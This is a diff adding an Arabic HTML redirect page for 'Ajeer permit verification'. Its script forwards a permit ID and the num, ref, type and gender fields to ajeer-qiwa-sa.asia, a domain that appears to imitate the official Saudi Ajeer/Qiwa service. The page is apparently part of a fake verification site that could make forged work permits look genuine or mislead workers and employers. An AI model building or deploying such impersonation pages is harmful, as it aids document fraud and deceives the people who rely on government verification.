@@ -1,0 +1,43 @@
+<!doctype html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <meta name="robots" content="noindex,follow">
+  <title>التحقق من تصريح أجير</title>
+</head>
+<body>
+  <p id="message">جاري تحويلك إلى صفحة التحقق...</p>
+  <script>
+  (function () {
+    "use strict";
+
+    const params = new URLSearchParams(window.location.search);
+    const parts = window.location.pathname.split("/").filter(Boolean);
+    const last = parts[parts.length - 1] || "";
+    const reserved = ["index.html", "view", "verify.htm", "verify.html", "add-verify.html"];
+    const id = (params.get("id") || (!reserved.includes(last) ? last : "")).trim();
+
+    if (!id) {
+      document.getElementById("message").textContent =
+        "رابط التحقق غير مكتمل: رقم التصريح غير موجود.";
+      return;
+    }
+
+    const type = (params.get("type") || "").trim().toLowerCase();
+    const additional = ["add", "additional", "extra"].includes(type);
+    const blocked = type === "blocked";
+    const page = blocked ? "blocked.html" : (additional ? "add-verify.html" : "verify.html");
+    const target = new URL("https://ajeer-qiwa-sa.asia/ajeer/" + page);
+
+    target.searchParams.set("id", id);
+    ["num", "ref", "type", "gender"].forEach(function (key) {
+      const value = params.get(key);
+      if (value !== null && value !== "") target.searchParams.set(key, value);
+    });
+
+    window.location.replace(target.toString());
+  })();
+  </script>
+</body>
+</html>
